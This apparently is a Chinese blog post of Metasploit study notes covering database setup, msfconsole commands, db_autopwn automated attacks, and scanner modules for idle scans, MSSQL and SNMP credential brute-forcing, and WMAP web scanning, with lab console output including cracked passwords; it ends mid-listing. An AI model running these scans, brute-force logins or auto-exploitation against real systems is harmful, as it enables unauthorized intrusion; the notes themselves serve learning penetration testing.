---
title: Metasploit
layout: post
tags:
  - sec
  - hack
  - tools
category: 
  - hack
  - sec
comments: true
share: true
description: 整理了下以前看Metasploit资料做的部分笔记
---

整理了下以前看Metasploit资料做的部分笔记

* TOC
{:toc}

<!--more-->


metasploit由五个结构组成，库、接口、模块、插件、工具。

## Armitage

shell直接运行`armitage`:


![armitage](/img/hack/Metasploit/1487236822452.png)

## MSFConsole

### msf数据库

```javascript
root@kali:/usr/share/metasploit-framework/config# su postgres
postgres@kali:/usr/share/metasploit-framework/config$ createuser msf4 -P
Enter password for new role: 
Enter it again: 
postgres@kali:/usr/share/metasploit-framework/config$ createdb --owner=msf4 msf4
```

>msf4为创建的用户名
>创建数据库。owner参数指定数据库的所有者，最后一个参数为数据库名称

进入msf，连接数据库

```javascript
postgres@kali:/usr/share/metasploit-framework/config$ msfconsole                                              ...
msf > db_connect msf4:msf4@localhost/metasploit3
[-] Error while running command db_connect: Failed to connect to the database: PG::InsufficientPrivilege: ERROR:  permission denied to create database
: CREATE DATABASE "metasploit3" ENCODING = 'utf8'
```


查看postgresql数据库的默认密码，并连接数据库

```javascript
root@kali:/usr/share/metasploit-framework/config# vim database.yml
```


![Alt text](/img/hack/Metasploit/1487254054731.png)

查看数据库连接情况

```javascript
msf > db_connect -h
[*]    Usage: db_connect <user:pass>@<host:port>/<database>
[*]       OR: db_connect -y [path/to/database.yml]
[*] Examples:
[*]        db_connect user@metasploit3
[*]        db_connect user:pass@192.168.0.2/metasploit3
[*]        db_connect user:pass@192.168.0.2:1500/metasploit3
```


查看msf数据库情况

```javascript
msf > db_status
[*] postgresql connected to msf
```


初始化msf数据库

```javascript
root@kali:# msfdb init
```



`irb`参数，进入irb脚本模式(ruby)，并且执行命令创建脚本


![脚本模式](/img/hack/Metasploit/1487226585243.png)

查看mefconsole存在的任务

![jobs命令](/img/hack/Metasploit/1487226678866.png)


load参数从metasploit的plug里面加载插件

![Alt text](/img/hack/Metasploit/1487226740488.png)

`unload`参数终止启动的插件
![Alt text](/img/hack/Metasploit/1487226781525.png)

`resource`参数，可运行一些资源文件、工具。比如无线攻击就需要这个参数
![Alt text](/img/hack/Metasploit/1487226849995.png)

`route`参数用作跳板，词参数可以用作代理转发
![Alt text](/img/hack/Metasploit/1487226917629.png)

`search`参数。输入`search -h`参数和`help search`时候，会列出search命令的一些选项。

![Alt text](/img/hack/Metasploit/1487227050143.png)

* 通过名称进行查找，`search name:`
![Alt text](/img/hack/Metasploit/1487227276220.png)

* 通过查找路径，`search path:`
![Alt text](/img/hack/Metasploit/1487227228078.png)

* 通过platform命令缩小查询范围，所查询的结果会列出比较高的模块。
![Alt text](/img/hack/Metasploit/1487227363443.png)

* 通过`search type:`查找（只能查找exploit、post、auxiliary三种模块）
![Alt text](/img/hack/Metasploit/1487227562789.png)

* 通过作者查找
![Alt text](/img/hack/Metasploit/1487227671666.png)

* 通过联合查询
![Alt text](/img/hack/Metasploit/1487227783430.png)

`session`参数，这个参数可以交互，查询或者终止当前的一些会话
![Alt text](/img/hack/Metasploit/1487227858407.png)

`set`参数，主要是对payload或者其他模块进行设置。
![Alt text](/img/hack/Metasploit/1487227934443.png)

`unset`参数是在使用set命令之后，发现设置错误，可以重新设置![Alt text](/img/hack/Metasploit/1487228033383.png)

`setg`参数类似于set，但是这个是全局变量，设置保存之后，这个漏洞的模块就不用重复设置在某一个模块设置全局变量之后，使用该模块的时候，需要检查option选项，以免做重复的渗透工作。同理，unsetg也可以重新设置

**show参数**。单纯输入show，会显示所有的payload、利用模块、post模块、插件等。如`show exploits` 、`show payloads` 、`show encoders`、 `show nops`

### db_autopwn

下载db_autopwn：

```
wget https://raw.githubusercontent.com/hahwul/metasploit-db_autopwn/master/db_autopwn.rb
```

放入到`/usr/share/metasploit-framework/plugins`目录，然后在msf中`load db_autopwn`加载。

在使用了扫描之后可以使用`db_autopwn`自动化攻击：

```
MSF > db_autopwn -p -R great -e -q ip
```

## auxiliary

### scanner/ip/ipidseq(TCP扫描空闲主机)

```javascript
msf > use auxiliary/scanner/ip/ipidseq 
msf auxiliary(ipidseq) > show options

Module options (auxiliary/scanner/ip/ipidseq):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

msf auxiliary(ipidseq) > set RHOSTS 10.10.10.0/24
RHOSTS => 10.10.10.0/24
msf auxiliary(ipidseq) > set THREADS 20
THREADS => 20
msf auxiliary(ipidseq) > run

[*] 10.10.10.2's IPID sequence class: Incremental!
[*] 10.10.10.1's IPID sequence class: Incremental!
[*] Scanned  26 of 256 hosts (10% complete)
[*] Scanned  52 of 256 hosts (20% complete)
[*] Scanned  77 of 256 hosts (30% complete)
[*] Scanned 103 of 256 hosts (40% complete)
[*] 10.10.10.129's IPID sequence class: All zeros
[*] Scanned 128 of 256 hosts (50% complete)
[*] Scanned 154 of 256 hosts (60% complete)
[*] Scanned 180 of 256 hosts (70% complete)
[*] Scanned 205 of 256 hosts (80% complete)
[*] Scanned 231 of 256 hosts (90% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

通过对扫描结果分析，发现多个空闲主机可用于空闲扫描。尝试在`-sI`选项指定10.10.10.2作为空闲主机对目标主机进行扫描。
```javascript
sf auxiliary(ipidseq) > nmap -PN -sI 10.10.10.2 10.10.10.129
[*] exec: nmap -PN -sI 10.10.10.2 10.10.10.129
Starting Nmap 7.01 ( https://nmap.org ) at -02-16 08:53 EST
Idle scan using zombie 10.10.10.2 (10.10.10.2:80); Class: Incremental
Nmap scan report for 10.10.10.129
Host is up (0.053s latency).
Not shown: 992 closed|filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
5001/tcp open  commplex-link
8080/tcp open  http-proxy
MAC Address: 00:0C:29:DD:B7:5B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds

```



> 使用空闲扫描，可以不使用自身IP地址向目标发送任何数据包，就能获得目标主机上开放的端口信息。

### db_nmap

在msf中进行nmap扫描的之前需要连接数据库

```javascript


msf > db_nmap -sS -A 10.10.10.129
[*] Nmap: Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-16 09:42 EST
[*] Nmap: Nmap scan report for 10.10.10.129
[*] Nmap: Host is up (0.00037s latency).
[*] Nmap: Not shown: 992 closed ports
[*] Nmap: PORT     STATE SERVICE     VERSION
[*] Nmap: 21/tcp   open  ftp         vsftpd 2.2.2
[*] Nmap: 22/tcp   open  ssh         OpenSSH 5.3p1 Debian 3ubuntu4 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   1024 ea:83:1e:45:5a:a6:8c:43:1c:3c:e3:18:dd:fc:88:a5 (DSA)
[*] Nmap: |_  2048 3a:94:d8:3f:e0:a2:7a:b8:c3:94:d7:5e:00:55:0c:a7 (RSA)
[*] Nmap: 80/tcp   open  http        Apache httpd 2.2.14 ((Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1)
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: | http-robots.txt: 14 disallowed entries
[*] Nmap: | /administrator/ /cache/ /components/ /images/
[*] Nmap: | /includes/ /installation/ /language/ /libraries/ /media/
[*] Nmap: |_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
[*] Nmap: |_http-server-header: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1
[*] Nmap: |_http-title: Free CSS template by ChocoTemplates.com
[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
[*] Nmap: 143/tcp  open  imap        Courier Imapd (released 2008)
[*] Nmap: |_imap-capabilities: completed CAPABILITY ACL QUOTA THREAD=ORDEREDSUBJECT UIDPLUS OK ACL2=UNIONA0001 SORT CHILDREN IMAP4rev1 NAMESPACE THREAD=REFERENCES IDLE
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
[*] Nmap: 5001/tcp open  java-rmi    Java RMI
[*] Nmap: |_rmi-dumpregistry: Registry listing failed (Handshake failed)
[*] Nmap: 8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: PUT DELETE
[*] Nmap: |_http-server-header: Apache-Coyote/1.1
[*] Nmap: |_http-title: Apache Tomcat/6.0.24 - Error report
[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[*] Nmap: SF-Port5001-TCP:V=7.01%I=7%D=2/16%Time=58A5BA57%P=x86_64-pc-linux-gnu%r(NU
[*] Nmap: SF:LL,4,"\xac\xed\0\x05");
[*] Nmap: MAC Address: 00:0C:29:DD:B7:5B (VMware)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 2.6.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:2.6
[*] Nmap: OS details: Linux 2.6.17 - 2.6.36
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Host script results:
[*] Nmap: |_nbstat: NetBIOS name: OWASPBWA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
[*] Nmap: | smb-security-mode:
[*] Nmap: |   account_used: guest
[*] Nmap: |   authentication_level: user
[*] Nmap: |   challenge_response: supported
[*] Nmap: |_  message_signing: disabled (dangerous, but default)
[*] Nmap: |_smbv2-enabled: Server doesn't support SMBv2 protocol
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.37 ms 10.10.10.129
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 21.11 seconds

```

执行db_services命令查看数据库中运行服务的扫描结果
```javascript

msf > db_services
[-] The db_services command is DEPRECATED
[-] Use services instead

Services
========

host          port  proto  name         state  info
----          ----  -----  ----         -----  ----
10.10.10.129  21    tcp    ftp          open   vsftpd 2.2.2
10.10.10.129  22    tcp    ssh          open   OpenSSH 5.3p1 Debian 3ubuntu4 Ubuntu Linux; protocol 2.0
10.10.10.129  80    tcp    http         open   Apache httpd 2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1
10.10.10.129  139   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
10.10.10.129  143   tcp    imap         open   Courier Imapd released 2008
10.10.10.129  445   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
10.10.10.129  5001  tcp    java-rmi     open   Java RMI
10.10.10.129  8080  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
```


### 端口扫描

```javascript
msf > use scanner/portscan/syn
msf auxiliary(syn) > show options

Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   INTERFACE                   no        The name of the interface
   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                      yes       The target address range or CIDR identifier
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

msf auxiliary(syn) > set RHOSTS 10.10.10.129
RHOSTS => 10.10.10.129
msf auxiliary(syn) > set THREADS 30
THREADS => 30
msf auxiliary(syn) > run

[*]  TCP OPEN 10.10.10.129:21
[*]  TCP OPEN 10.10.10.129:22
[*]  TCP OPEN 10.10.10.129:80
[*]  TCP OPEN 10.10.10.129:139
[*]  TCP OPEN 10.10.10.129:143
[*]  TCP OPEN 10.10.10.129:445
[*]  TCP OPEN 10.10.10.129:5001
[*]  TCP OPEN 10.10.10.129:8080
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


查看扫描的结果
```javascript


msf auxiliary(smb_version) > hosts -c address,os_flavor

Hosts
=====

address       os_flavor
-------       ---------
10.10.10.1    
10.10.10.2    
10.10.10.129  

msf auxiliary(smb_version) > hosts -c address,os_flavor,vuln_count

Hosts
=====

address       os_flavor  vuln_count
-------       ---------  ----------
10.10.10.1               0
10.10.10.2               0
10.10.10.129             1

msf auxiliary(smb_version) > hosts 10.10.10.129

Hosts
=====

address       mac                name          os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----          -------  ---------  -----  -------  ----  --------
10.10.10.129  00:0c:29:dd:b7:5b  10.10.10.129  Linux               2.6.X  server         

```

>避免被对方察觉， 快速且安全的扫描到目标

### 扫描配置不当的MSSQL

配置不当的MSSQL通常作为进入目标系统的第一个后门。MSSQL常作为其他常用软件(如VS)的先决条件被安装，很多管理员不知道他们的工作站安装MSSQL，且很少安装补丁或者配置。

```javascript


msf > use scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > show options

Module options (auxiliary/scanner/mssql/mssql_ping):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target address range or CIDR identifier
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
msf auxiliary(mssql_ping) > set RHOSTS 10.10.10.150
RHOSTS => 10.10.10.150
msf auxiliary(mssql_ping) > set THREADS 255
THREADS => 255
msf auxiliary(mssql_ping) > run

[*] SQL Server information for 10.10.10.150:
[+]    ServerName      = WIN-9V6F900LMVH
[+]    InstanceName    = SQLEXPRESS
[+]    IsClustered     = No
[+]    Version         = 9.00.4035.00
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


> 在大量主机的子网中去查找MSSQL的监听端口，使用此方法的速度比起用nmap对所有主机的所有端口进行扫描要快得多

### 暴力破解MSSQL

**0x01 使用nmap扫描网络服务情况**
```javascript


db_nmap -sT -A -P0 10.10.10.130
```

![Alt text](/img/hack/Metasploit/1488679049102.png)

**0x02确认MSSQL的存在**
```javascript
msf exploit(mssql_payload) > nmap -sU 10.10.10.130 -p1434
[*] exec: nmap -sU 10.10.10.130 -p1434


Starting Nmap 7.01 ( https://nmap.org ) at 2016-03-04 20:47 EST
Nmap scan report for service.dvssc.com (10.10.10.130)
Host is up (0.00035s latency).
PORT     STATE         SERVICE
1434/udp open|filtered ms-sql-m
MAC Address: 00:0C:29:9D:6E:8D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```


**0x03`mssql_ping模块找出mssql服务情况`**

```javascript
msf exploit(mssql_payload) > use auxiliary/scanner/mssql/mssql_ping 
msf auxiliary(mssql_ping) > set RHOSTS 10.10.10.130
RHOSTS => 10.10.10.130
msf auxiliary(mssql_ping) > show options

Module options (auxiliary/scanner/mssql/mssql_ping):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS               10.10.10.130     yes       The target address range or CIDR identifier
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              20               yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(mssql_ping) > exploit

[*] SQL Server information for 10.10.10.130:
[+]    ServerName      = ROOT-TVI862UBEH
[+]    InstanceName    = MSSQLSERVER
[+]    IsClustered     = No
[+]    Version         = 9.00.1399.06
[+]    tcp             = 1433
[+]    np              = \\ROOT-TVI862UBEH\pipe\sql\query
[+]    via             = ROOT-TVI862UBEH,0:1433
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mssql_ping) > 
```javascript


**用户名和口令猜测**
MSSQL在初次安装时，需要用户创建sa或者系统管理员用户，管理员在安装时，又常常会设置空密码或者弱密码，所以可以尝试暴力破解密码
```javascript


msf auxiliary(mssql_ping) > use auxiliary/scanner/mssql/mssql_login
msf auxiliary(mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting                     Required  Description
   ----                 ---------------                     --------  -----------
   BLANK_PASSWORDS      false                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false                               no        Add all passwords in the current database to the list
   DB_ALL_USERS         false                               no        Add all users in the current database to the list
   PASSWORD                                                 no        A specific password to authenticate with
   PASS_FILE            /usr/share/wordlists/fasttrack.txt  no        File containing passwords, one per line
   RHOSTS               10.10.10.130                        yes       The target address range or CIDR identifier
 ...

msf auxiliary(mssql_login) > exploit 

[*] 10.10.10.130:1433 - MSSQL - Starting authentication scanner.
[+] 10.10.10.130:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:admin3333
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mssql_login) > 
```

爆破出密码是amdin3333

### ssh服务器扫描

使用Metasploit伤的`ssh_version`魔魁啊来识别服务器上运行的SSH版本。
```javascript


msf > use scanner/ssh/ssh_version
msf auxiliary(ssh_version) > show options

Module options (auxiliary/scanner/ssh/ssh_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    22               yes       The target port
   THREADS  1                yes       The number of concurrent threads
   TIMEOUT  30               yes       Timeout for the SSH probe

msf auxiliary(ssh_version) > set THREADS 55
THREADS => 55
msf auxiliary(ssh_version) > set RHOSTS 10.10.10.1/24
RHOSTS => 10.10.10.1/24
msf auxiliary(ssh_version) > run

[*] 10.10.10.1:22 SSH server version: SSH-2.0-MS_1.100
[*] Scanned  32 of 256 hosts (12% complete)
[*] Scanned  56 of 256 hosts (21% complete)
[*] Scanned  78 of 256 hosts (30% complete)
[*] 10.10.10.129:22 SSH server version: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4 ( service.version=5.3p1 openssh.comment=Debian-3ubuntu4 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=10.04 )
[*] Scanned 107 of 256 hosts (41% complete)
[*] Scanned 131 of 256 hosts (51% complete)
[*] Scanned 160 of 256 hosts (62% complete)
[*] Scanned 186 of 256 hosts (72% complete)
[*] Scanned 206 of 256 hosts (80% complete)
[*] Scanned 231 of 256 hosts (90% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```


### FTP扫描

```javascript
msf > use scanner/ftp/ftp_version
msf auxiliary(ftp_version) > show options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port
   THREADS  1                    yes       The number of concurrent threads

msf auxiliary(ftp_version) > set RHOSTS 10.10.10.0/24
RHOSTS => 10.10.10.0/24
msf auxiliary(ftp_version) > set THREADS 50
THREADS => 50
msf auxiliary(ftp_version) > run

[*] Scanned  51 of 256 hosts (19% complete)
[*] Scanned  52 of 256 hosts (20% complete)
[*] Scanned  86 of 256 hosts (33% complete)
[*] 10.10.10.129:21 FTP Banner: '220 (vsFTPd 2.2.2)\x0d\x0a'
[*] Scanned 104 of 256 hosts (40% complete)
[*] Scanned 128 of 256 hosts (50% complete)
[*] Scanned 154 of 256 hosts (60% complete)
[*] Scanned 181 of 256 hosts (70% complete)
[*] Scanned 205 of 256 hosts (80% complete)
[*] Scanned 231 of 256 hosts (90% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

![Alt text](/img/hack/Metasploit/1487290929379.png)
扫描出FTP服务器，使用`scanner/ftp/anonymous`模块检查一下该FTP服务器是否允许匿名用户登录：
![Alt text](/img/hack/Metasploit/1487291169548.png)

### 简单网管协议扫描

简单网管协议（SNMP）通常用于网络设备，用来报告宽带利用率、冲突率以及其他信息。一些操作系统也包含SNMP服务器软件，主要用来提供类似CPU利用率、空闲内存以及其他系统状态信息。
可访问的SNMP服务器能够泄露关于特定系统相当多的信息，甚至会导致设备被远程攻陷。如果能得到具有可R/W的Cisco路由器SNMP团体字符串，便可以下载整个路由器的配置，对其进行修改，并把它传回到路由器中。
```javascript
msf > use scanner/snmp/snmp_login
msf auxiliary(snmp_login) > show options

Module options (auxiliary/scanner/snmp/snmp_login):

   Name              Current Setting                                                       Required  Description
   ----              ---------------                                                       --------  -----------
   BLANK_PASSWORDS   false                                                                 no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                     yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                 no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                 no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                 no        Add all users in the current database to the list
   PASSWORD                                                                                no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line
   RHOSTS                                                                                  yes       The target address range or CIDR identifier
   RPORT             161                                                                   yes       The target port
   STOP_ON_SUCCESS   false                                                                 yes       Stop guessing when a credential works for a host
   THREADS           1                                                                     yes       The number of concurrent threads
   USER_AS_PASS      false                                                                 no        Try the username as the password for all users
   VERBOSE           true                                                                  yes       Whether to print output for all attempts
   VERSION           1                                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)
msf auxiliary(snmp_login) > set THREADS 50
THREADS => 50
msf auxiliary(snmp_login) > set RHOSTS 192.168.0.1/24
RHOSTS => 192.168.0.1/24
msf auxiliary(snmp_login) > run

[*] Scanned  46 of 256 hosts (17% complete)
[*] Scanned  73 of 256 hosts (28% complete)
[*] Scanned  81 of 256 hosts (31% complete)
[*] Scanned 115 of 256 hosts (44% complete)
[*] Scanned 131 of 256 hosts (51% complete)
[+] 192.168.0.144:161 - LOGIN SUCCESSFUL: canon_admin (Access level: read-write); Proof (sysDescr.0): Canon MF620C Series /P
[+] 192.168.0.144:161 - LOGIN SUCCESSFUL: public (Access level: read-write); Proof (sysDescr.0): Canon MF620C Series /P
[*] Scanned 165 of 256 hosts (64% complete)
[*] Scanned 181 of 256 hosts (70% complete)
[*] Scanned 212 of 256 hosts (82% complete)
[*] Scanned 231 of 256 hosts (90% complete)
[+] 192.168.0.255:161 - LOGIN SUCCESSFUL: canon_admin (Access level: read-write); Proof (sysDescr.0): Canon MF620C Series /P
[+] 192.168.0.255:161 - LOGIN SUCCESSFUL: public (Access level: read-write); Proof (sysDescr.0): Canon MF620C Series /P
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```




## msfconsole启动插件




### wmap

WMAP是一款基于Metasploit的通用的web应用程序扫描框架,它是一个简单，但强大的架构。WMAP不依赖于浏览器或是蜘蛛程序去捕获和操作数据。事实上WMAP的设计可以使任何工具变成数据采集工具。你可以选择使用浏览器或是蜘蛛程序。WMAP是一个metasploit插件，它能与数据库交互，读取所有采集的数据包并处理，然后加载不同的模块。

**0x01 启动数据库**
```javascript
root@kali:~# service postgresql start
```

**0x02 启动msf**
格式化msf数据库
```javascript
root@kali:~# msfdb init
Creating database user 'msf'
Enter password for new role: 
Enter it again: 
Creating databases 'msf' and 'msf_test'
Creating configuration file in /usr/share/metasploit-framework/config/database.yml
Creating initial database schema
```


启动msf
```javascript

root@kali:~# msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


Taking notes in notepad? Have Metasploit Pro track & report
your progress and findings -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.8-                             ]
+ -- --=[ 1519 exploits - 880 auxiliary - 259 post        ]
+ -- --=[ 437 payloads - 38 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
msf > db_status   //查看数据库连接情况
[*] postgresql connected to msf
```



**0x03加载wmap插件**
```javascript
msf > load wmap

.-.-.-..-.-.-..---..---.
| | | || | | || | || |-'
`-----'`-'-'-'`-^-'`-'
[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
[*] Successfully loaded plugin: wmap
```

**0x04**查看wmap的使用帮助
```javascript
msf > help

wmap Commands
=============

    Command       Description
    -------       -----------
    wmap_modules  Manage wmap modules
    wmap_nodes    Manage nodes
    wmap_run      Test targets
    wmap_sites    Manage sites
    wmap_targets  Manage targets
    wmap_vulns    Display web vulns


Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    edit          Edit the current module with $VISUAL or $EDITOR
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    info          Displays information about one or more modules
    irb           Drop into irb scripting mode
    jobs          Displays and manages jobs
    kill          Kill a job
    load          Load a framework plugin
    loadpath      Searches for and loads modules from a path
    makerc        Save commands entered since start to a file
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    quit          Exit the console
    reload_all    Reloads all modules from all defined module paths
    rename_job    Rename a job
    resource      Run the commands stored in a file
    route         Route traffic through a session
    save          Saves the active datastores
    search        Searches module names and descriptions
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    show          Displays modules of a given type, or all modules
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    use           Selects a module by name
    version       Show the framework and console library version numbers


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    creds             List all credentials in the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
```

**0x05设置目标url**
```javascript
msf > wmap_sites -a http://10.10.10.129
[*] Site created.
```

**0x06查看添加的站点**
```javascript
msf > wmap_sites -l
[*] Available sites
===============

     Id  Host          Vhost         Port  Proto  # Pages  # Forms
     --  ----          -----         ----  -----  -------  -------
     0   10.10.10.129  10.10.10.129  80    http   0        0
```

**0x07查看wmap_targets的使用，并添加目标**
```javascript
msf > wmap_targets -h
[*] Usage: wmap_targets [options]
	-h 		Display this help text
	-t [urls]	Define target sites (vhost1,url[space]vhost2,url) 
	-d [ids]	Define target sites (id1, id2, id3 ...)
	-c 		Clean target sites list
	-l  		List all target sites

msf > wmap_targets -d 0
[*] Loading 10.10.10.129,http://10.10.10.129:80/.
```

**0x08查看设定的wmap_targets**
```javascript
msf > wmap_targets -l
[*] Defined targets
===============

     Id  Vhost         Host          Port  SSL    Path
     --  -----         ----          ----  ---    ----
     0   10.10.10.129  10.10.10.129  80    false  	/
```


**0x09查看wmap开启的模块**
```javascript
[*] Usage: wmap_run [options]
	-h                        Display this help text
	-t                        Show all enabled modules
	-m [regex]                Launch only modules that name match provided regex.
	-p [regex]                Only test path defined by regex.
	-e [/path/to/profile]     Launch profile modules against all matched targets.
	                          (No profile file runs all enabled modules.)
msf > wmap_run -t
[*] Testing target:
[*] 	Site: 10.10.10.129 (10.10.10.129)
[*] 	Port: 80 SSL: false
============================================================
[*] Testing started. -02-16 03:31:00 -0500
[*] Loading wmap modules...
[*] 40 wmap enabled modules loaded.
[*] 
=[ SSL testing ]=
============================================================
[*] Target is not SSL. SSL modules disabled.
[*] 
=[ Web Server testing ]=
============================================================
[*] Module auxiliary/scanner/http/http_version
[*] Module auxiliary/scanner/http/open_proxy
[*] Module auxiliary/admin/http/tomcat_administration
[*] Module auxiliary/admin/http/tomcat_utf8_traversal
[*] Module auxiliary/scanner/http/drupal_views_user_enum
[*] Module auxiliary/scanner/http/frontpage_login
[*] Module auxiliary/scanner/http/host_header_injection
[*] Module auxiliary/scanner/http/options
[*] Module auxiliary/scanner/http/robots_txt
[*] Module auxiliary/scanner/http/scraper
[*] Module auxiliary/scanner/http/svn_scanner
[*] Module auxiliary/scanner/http/trace
[*] Module auxiliary/scanner/http/vhost_scanner
[*] Module auxiliary/scanner/http/webdav_internal_ip
[*] Module auxiliary/scanner/http/webdav_scanner
[*] Module auxiliary/scanner/http/webdav_website_content
[*] 
=[ File/Dir testing ]=
============================================================
[*] Module auxiliary/dos/http/apache_range_dos
